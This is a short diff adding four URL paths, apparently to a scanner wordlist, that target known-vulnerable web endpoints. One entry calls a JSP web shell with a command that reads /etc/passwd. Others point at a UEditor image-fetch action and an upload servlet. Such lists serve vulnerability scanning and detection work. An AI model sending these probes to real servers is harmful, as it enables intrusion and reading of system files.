@@ -1,0 +1,4 @@
+/poc.jsp/
+/poc.jsp?cmd=cat+%2Fetc%2Fpasswd
+/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
+/service/~baseapp/UploadServlet
